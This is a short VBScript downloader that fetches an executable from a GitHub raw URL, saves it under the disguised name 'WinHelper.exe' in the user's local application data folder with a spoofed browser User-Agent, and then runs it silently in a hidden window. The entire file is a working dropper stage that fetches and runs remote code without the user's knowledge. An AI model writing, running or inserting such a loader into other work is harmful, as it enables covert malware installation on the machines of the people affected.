Option Explicit

Dim fso, ws, http, url, targetDir, targetPath, stream

Set fso = CreateObject("Scripting.FileSystemObject")
Set ws  = CreateObject("WScript.Shell")

' 1. Define paths
targetDir  = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%")
targetPath = fso.BuildPath(targetDir, "WinHelper.exe")
url = "https://raw.githubusercontent.com/Buff220/test123/refs/heads/main/adv_element.exe"

' 2. Check if file exists, if not download
If Not fso.FileExists(targetPath) Then
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

    ' Send is a Sub: call it, THEN check the status
    http.Send

    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1          ' adTypeBinary
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile targetPath, 2   ' adSaveCreateOverWrite
        stream.Close
        Set stream = Nothing
    Else
        WScript.Echo "Download failed. HTTP Status: " & http.Status
    End If

    Set http = Nothing
End If

' 3. Execute silently
If fso.FileExists(targetPath) Then
    ws.Run """" & targetPath & """", 0, False
    WScript.Sleep 1000
End If
